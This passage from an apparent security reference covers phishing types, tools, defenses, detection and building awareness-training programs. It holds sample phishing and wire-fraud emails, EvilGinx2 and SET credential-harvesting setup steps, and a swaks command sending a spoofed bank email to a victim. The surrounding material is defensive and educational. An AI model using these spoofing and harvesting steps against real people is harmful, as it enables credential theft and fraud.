- HTML email crafting

**Examples:**
```
Subject: Urgent: Your account has been compromised
From: security@bank-secure.com
Body: Click here to verify your account immediately
Link: http://bank-secure.com/verify (malicious)
```

**Detection:**
- Email header analysis
- URL reputation checking
- Content analysis
- Sender authentication (SPF, DKIM, DMARC)

###### 2. Spear Phishing

**Characteristics:**
- Targeted attacks
- Personalized content
- Research-based
- Higher success rate

**Techniques:**
- OSINT gathering
- Social media research
- Organization mapping
- Relationship exploitation

**Examples:**
```
Subject: Re: Q4 Budget Review
From: cfo@company.com
Body: Please review the attached budget document
Attachment: Q4_Budget.xlsx (malicious macro)
```

**Detection:**
- Behavioral analysis
- Content anomalies
- Attachment scanning
- User awareness

###### 3. Whaling

**Characteristics:**
- Target high-value individuals
- Executive impersonation
- Business context
- Financial motivation

**Techniques:**
- Executive research
- Business email compromise
- Authority exploitation
- Urgency creation

**Examples:**
```
Subject: Confidential: Acquisition Details
From: ceo@company.com
Body: Wire $500,000 to this account for the acquisition
Account: [attacker's account]
```

**Detection:**
- Executive email monitoring
- Financial transaction verification
- Multi-person approval
- Behavioral analysis

###### 4. Clone Phishing

**Characteristics:**
- Copy legitimate emails
- Modify links/attachments
- Exploit trust
- Resend to victims

**Techniques:**
- Email interception
- Content modification
- Link replacement
- Resend distribution

**Detection:**
- Email comparison
- Link analysis
- Sender verification
- Content scanning

###### 5. Business Email Compromise (BEC)

**Characteristics:**
- Account compromise
- Lateral movement
- Financial fraud
- Invoice manipulation

**Techniques:**
- Credential theft
- Email forwarding rules
- Invoice modification
- Payment redirection

**Detection:**
- Login monitoring
- Email rule analysis
- Financial verification
- Behavioral analytics

##### Phishing Tools

###### 1. Phishing Frameworks

**GoPhish:**
```bash
# Installation
https://github.com/gophish/gophish/releases

# Configuration
# Create campaign
# Design email
# Track results
```

**EvilGinx2:**
```bash
# Installation
git clone https://github.com/kgretzky/evilginx2.git

# Configuration
./evilginx2
config domain target.com
config ipv4 1.2.3.4

# Create phishlet
phishlet hostname target-login.com
domain target.com
```

**SET (Social Engineering Toolkit):**
```bash
# Launch SET
setoolkit

# Options
1) Social-Engineering Attacks
2) Website Attack Vectors
3) Credential Harvester Attack
4) Site Cloner
```

###### 2. Email Spoofing

**Swaks:**
```bash
# Send spoofed email
swaks --to victim@target.com --from security@bank.com \
  --header "Subject: Urgent: Account Verification" \
  --body "Click here to verify" \
  --server mail.target.com
```

**King Phisher:**
```bash
# Installation
https://github.com/securestate/king-phisher

# Configuration
# Create campaign
# Design email
# Track results
```

##### Phishing Defenses

###### 1. Email Security

**SPF (Sender Policy Framework):**
```
# DNS record
v=spf1 include:_spf.google.com ~all
```

**DKIM (DomainKeys Identified Mail):**
```
# DNS record
selector._domainkey IN TXT "v=DKIM1; k=rsa; p=MIGf..."
```

**DMARC (Domain-based Message Authentication):**
```
# DNS record
_dmarc IN TXT "v=DMARC1; p=reject; rua=mailto:dmarc@company.com"
```

###### 2. Email Filtering

**Content Filtering:**
- Keyword detection
- URL reputation
- Attachment scanning
- Header analysis

**Behavioral Analysis:**
- Sender reputation
- Communication patterns
- Anomaly detection
- Machine learning

###### 3. User Training

**Awareness Programs:**
- Regular training
- Simulated phishing
- Reporting procedures
- Incident response

**Best Practices:**
- Verify sender
- Check URLs
- Don't open attachments
- Report suspicious emails

##### Phishing Detection

###### 1. Technical Detection

**Email Header Analysis:**
```
# Check SPF
nslookup -type=txt target.com

# Check DKIM
nslookup -type=txt selector._domainkey.target.com

# Check DMARC
nslookup -type=txt _dmarc.target.com
```

**URL Analysis:**
```bash
# Check URL reputation
# VirusTotal
# URLScan.io
# PhishTank
```

**Attachment Analysis:**
```bash
# Scan attachments
# VirusTotal
# Any.Run
# Hybrid Analysis
```

###### 2. Behavioral Detection

**User Behavior:**
- Unusual login locations
- Unexpected email patterns
- Suspicious attachments
- Anomalous requests

**Email Patterns:**
- Unusual senders
- Unexpected content
- Suspicious timing
- Anomalous recipients

###### 3. Machine Learning Detection

**Features:**
- Email content
- Sender reputation
- URL analysis
- Attachment properties

**Models:**
- Random Forest
- Neural Networks
- SVM
- Ensemble methods

##### Incident Response

###### 1. Detection
- User reports
- Email security alerts
- Behavioral analytics
- Threat intelligence

###### 2. Containment
- Block sender
- Quarantine emails
- Reset credentials
- Isolate systems

###### 3. Eradication
- Remove malicious emails
- Block malicious URLs
- Patch vulnerabilities
- Update security controls

###### 4. Recovery
- Restore access
- Verify integrity
- Monitor for re-compromise
- Document lessons learned

##### Advanced Phishing Techniques

###### 1. AI-Generated Phishing

**Characteristics:**
- Personalized content
- Natural language
- Context-aware
- Difficult to detect

**Detection:**
- AI-based detection
- Behavioral analysis
- Content analysis
- User awareness

###### 2. Deepfake Phishing

**Characteristics:**
- Audio/video impersonation
- Executive impersonation
- High credibility
- Difficult to detect

**Detection:**
- Verification procedures
- Multi-factor authentication
- Out-of-band verification
- Awareness training

###### 3. QR Code Phishing

**Characteristics:**
- QR code links
- Mobile-targeted
- Bypass email security
- Difficult to detect

**Detection:**
- QR code scanning
- URL reputation
- Mobile security
- User awareness

##### Phishing Metrics

###### 1. Campaign Metrics
- Open rate
- Click rate
- Submission rate
- Report rate

###### 2. Security Metrics
- Detection rate
- Response time
- Remediation time
- User awareness

###### 3. Business Metrics
- Financial loss
- Data breach
- Reputation damage
- Compliance impact

##### Best Practices

###### 1. Technical Controls
- Email security gateways
- URL filtering
- Attachment sandboxing
- Authentication protocols

###### 2. Administrative Controls
- Security policies
- Training programs
- Incident response
- Regular assessments

###### 3. User Awareness
- Regular training
- Simulated phishing
- Reporting procedures
- Best practices

## How do I create phishing awareness training programs?

#### Phishing Awareness Training Program Guide

##### Program Planning

###### 1. Objectives
- Reduce phishing susceptibility
- Improve reporting rates
- Build security culture
- Meet compliance requirements

###### 2. Scope
- All employees
- Regular frequency
- Multiple channels
- Measurable outcomes

###### 3. Resources
- Training platform
- Content library
- Phishing simulation tools
- Reporting mechanisms

##### Training Content

###### 1. Basic Training

**Topics:**
- What is phishing
- Common techniques
- How to identify
- What to do

**Format:**
- Online modules
- Videos
- Quizzes
- Interactive content

###### 2. Advanced Training

**Topics:**
- Spear phishing
- BEC attacks
- Social engineering
- Advanced techniques

**Format:**
- Workshops
- Case studies
- Hands-on exercises
- Expert presentations

###### 3. Role-Based Training

**Executives:**
- Whaling attacks
- Business context
- Financial fraud
- Decision making

**Finance:**
- Invoice fraud
- Payment redirection
- Verification procedures
- Reporting protocols

**IT Staff:**
- Technical indicators
- Incident response
- Security tools
- Investigation techniques

**General Staff:**
- Basic awareness
- Reporting procedures
- Best practices
- Common threats

##### Phishing Simulations

###### 1. Planning

**Objectives:**
- Measure awareness
- Identify weaknesses
- Track improvement
- Reinforce training

**Frequency:**
- Monthly or quarterly
- Vary difficulty
- Different scenarios
- Progressive complexity

###### 2. Scenarios

**Basic:**
- Generic phishing
- Obvious indicators
- Common templates
- Educational feedback

**Intermediate:**
- Spear phishing
- Personalized content
- Realistic scenarios
- Detailed feedback

**Advanced:**
- BEC attacks
- Executive impersonation
- Complex scenarios
- Comprehensive feedback

###### 3. Execution

**Tools:**
- GoPhish
- KnowBe4
- Proofpoint
- Cofense

**Process:**
1. Select scenario
2. Configure campaign
3. Send simulation
4. Track results
5. Provide feedback
6. Analyze data

###### 4. Metrics

**Click Rate:**
- Percentage who clicked
- Track over time
- Compare to benchmarks
- Identify patterns

**Report Rate:**
- Percentage who reported
- Track improvement
- Reward reporters
- Encourage reporting

**Training Completion:**
- Percentage completed
- Track progress
- Ensure completion
- Follow up

##### Reporting Mechanisms

###### 1. Technical Solutions

**Email Add-ins:**
- Report button
- One-click reporting
- Automatic analysis
- Feedback loop

**Phishing Mailbox:**
- Dedicated address
- Easy to remember
- Monitored regularly
- Quick response

###### 2. Process

**Reporting Steps:**
1. Identify suspicious email
2. Click report button
3. Provide details
4. Receive feedback

**Response Process:**
1. Analyze report
2. Validate threat
3. Take action
4. Provide feedback

##### Communication

###### 1. Program Launch

**Announcement:**
- Program objectives
- Benefits to employees
- Participation expectations
- Support available

**Materials:**
- Emails
- Posters
- Intranet articles
- Manager communications

###### 2. Ongoing Communication

**Regular Updates:**
- Program progress
- Success stories
- Lessons learned
- Best practices

**Recognition:**
- Top reporters
- Improvement awards
- Team recognition
- Gamification

##### Continuous Improvement

###### 1. Data Analysis

**Metrics Review:**
- Click rates
- Report rates
- Training completion
- Incident trends

**Pattern Identification:**
- Common failures
- Vulnerable groups
- Effective training
- Improvement areas

###### 2. Program Adjustment

**Content Updates:**
- New threats
- Current events
- Industry-specific
- Feedback-based

**Frequency Changes:**
- Based on results
- Risk assessment
- Compliance requirements
- Resource availability

##### Compliance

###### 1. Regulatory Requirements

**GDPR:**
- Data protection
- Privacy training
- Consent management
- Documentation

**HIPAA:**
- Healthcare security
- Patient data
- Training requirements
- Documentation

**PCI DSS:**
- Payment security
- Training requirements
- Regular assessments
- Documentation

###### 2. Documentation

**Training Records:**
- Completion dates
- Scores
- Attendance
- Certificates

**Simulation Results:**
- Campaign data
- Click rates
- Report rates
- Improvement trends

##### Tools and Platforms

###### 1. Training Platforms
- KnowBe4
- Proofpoint
- Cofense
- SANS
- Curricula

###### 2. Simulation Tools
- GoPhish
- King Phisher
- SET
- EvilGinx2

###### 3. Reporting Tools
- Email add-ins
- Phishing mailbox
- SIEM integration
- Ticketing systems

##### Success Factors

###### 1. Executive Support
- Leadership commitment
- Resource allocation
- Communication
- Example setting

###### 2. Employee Engagement
- Relevant content
- Interactive training
- Recognition programs
- Feedback mechanisms

###### 3. Continuous Improvement
- Regular updates
- Data-driven decisions
- Feedback incorporation
- Technology updates

###### 4. Measurement
- Clear metrics
- Regular reporting
- Benchmark comparison
- ROI calculation
